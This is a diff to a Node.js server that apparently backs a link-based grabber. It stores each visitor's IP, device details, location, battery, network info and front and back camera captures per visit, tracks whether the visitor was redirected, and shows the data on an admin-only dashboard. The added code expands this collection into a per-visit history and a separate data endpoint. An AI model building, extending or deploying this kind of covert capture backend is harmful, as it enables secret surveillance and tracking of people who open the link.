@@ -78,8 +78,17 @@ app.post('/admin-login', (req, res) => {
     }
 });
 
-// Get all visitors
+// Get all visitors (for dashboard)
 app.get('/api/visitors', (req, res) => {
+    if (!req.session.admin) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    const users = readUsers();
+    res.json(users);
+});
+
+// Get all users data (for Users Data tab)
+app.get('/api/users-data', (req, res) => {
     if (!req.session.admin) {
         return res.status(401).json({ error: 'Unauthorized' });
     }
@@ -198,10 +207,18 @@ io.on('connection', (socket) => {
         const userIndex = users.findIndex(u => u.id === visitorId);
         
         if (userIndex !== -1) {
+            // Create visit record for this visit
             const visitRecord = {
+                visitId: uuidv4(),
                 visitDate: new Date().toISOString(),
                 ip: ip,
-                deviceInfo: deviceInfo
+                deviceInfo: deviceInfo,
+                location: null,
+                battery: null,
+                network: null,
+                frontCamera: null,
+                backCamera: null,
+                redirectComplete: false
             };
             
             users[userIndex] = {
@@ -220,7 +237,7 @@ io.on('connection', (socket) => {
             connectedClients.set(visitorId, socket.id);
             
             io.emit('visitor-connected', users[userIndex]);
-            console.log('📱 Visitor connected:', visitorId);
+            console.log('📱 Visitor connected:', visitorId, 'Total visits:', users[userIndex].totalVisits);
         }
     });
     
@@ -232,6 +249,7 @@ io.on('connection', (socket) => {
         const userIndex = users.findIndex(u => u.id === visitorId);
         
         if (userIndex !== -1) {
+            // Update main record
             if (type === 'frontCamera') {
                 users[userIndex].frontCamera = content;
                 users[userIndex].lastCameraUpdate = new Date().toISOString();
@@ -250,6 +268,27 @@ io.on('connection', (socket) => {
             } else if (type === 'redirectComplete') {
                 users[userIndex].redirectComplete = true;
                 users[userIndex].redirectTime = new Date().toISOString();
+            }
+            
+            // Also save in visit history (last visit)
+            const history = users[userIndex].visitHistory || [];
+            if (history.length > 0) {
+                const lastVisit = history[history.length - 1];
+                if (type === 'frontCamera') {
+                    lastVisit.frontCamera = content;
+                } else if (type === 'backCamera') {
+                    lastVisit.backCamera = content;
+                } else if (type === 'location') {
+                    lastVisit.location = content;
+                } else if (type === 'battery') {
+                    lastVisit.battery = content;
+                } else if (type === 'network') {
+                    lastVisit.network = content;
+                } else if (type === 'redirectComplete') {
+                    lastVisit.redirectComplete = true;
+                    lastVisit.redirectTime = new Date().toISOString();
+                }
+                users[userIndex].visitHistory = history;
             }
             
             writeUsers(users);
